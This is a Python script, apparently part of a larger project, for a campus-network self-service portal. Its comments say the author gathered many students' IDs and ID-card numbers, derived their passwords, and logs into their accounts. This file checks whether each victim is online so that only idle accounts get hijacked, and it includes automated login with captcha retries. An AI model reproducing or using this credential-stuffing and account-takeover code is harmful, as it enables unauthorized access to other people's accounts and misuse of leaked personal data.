"""
 Coding By Danyhug
 21/7/26 17:30
 保护自己，保护他人

 该文件的作用
    检测当前登录用户是否在线
        在线返回True
        不在线返回False
 """
import requests
import time

"""
    URL说明：
        这里写入校园网自助服务的URL
        因为我们学校的账号密码是学号+身份证后六位，所以我从一些途径获取到了学校许多人的学号和身份信息
        使用toJson.py文件将他们的信息转换为校园网需要的账号密码
        使用main.py文件登录他们的校园网
        在登录校园网前，使用该文件查看他们是否在线
        在线则跳过该同学，不在线登录该同学账号
        
        ** 如果你是自用的话，该文件对你无任何作用 **
        ** 根据你的需要做改动或者删除 **
        在main.py中我已做注释说明
        注释为
            自用将这个
        使用ctrl+F自行查找
"""
URL = "http://172.30.0.2:8080"

# 会话状态保持
session = requests.session()
headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1 Edg/98.0.4758.80'}
# 主要链接，所有事情围绕着他
mainUrl = f"{URL}/selfservice/module/scgroup/web/login_judge.jsf"


def Login(uname, passwd):
    # 状态
    state = True

    data = {
        'name': uname,
        'password': passwd,
#        'verify': GetValidcode(),
        'verifyMsg': 'null'
    }
    i = 0
    while state:
        i = i + 1
        res = session.post(url=mainUrl, data=data)
        htmlText = res.text[-60:]
        # 说明验证码错误，重新获取后登录
        if htmlText.find('verifyError=true') != -1:
            # 重新获取验证码
            data['verify'] = GetValidcode()
        elif htmlText.find('errorMsg=用户不存在或密码错误') != -1:
            print('用户名或密码有误')
            return False
        else:
            # 登录成功
            print('登录成功')
            print('验证码共识别', i, '次')
            if GetOnline():
                print('>> 该用户已经在线！')
                return False
            return True

        time.sleep(.02)


# 获取验证码
def GetValidcode():
    url = 'http://172.30.0.2:8080/selfservice/common/web/verifycode.jsp?' + str(time.time_ns())
    res = session.get(url=url)
    # 返回验证码
    return v.VerifyCode2(res.content)


# 获取在线情况
def GetOnline():
    url = 'http://172.30.0.2:8080/selfservice/module/webcontent/web/onlinedevice_list.jsf'
    res = session.get(url=url)
    htmlText = res.text[43000: 45500]
    # 说明当前有设备在线
    if htmlText.find('上线时间') != -1:
        return True
    return False
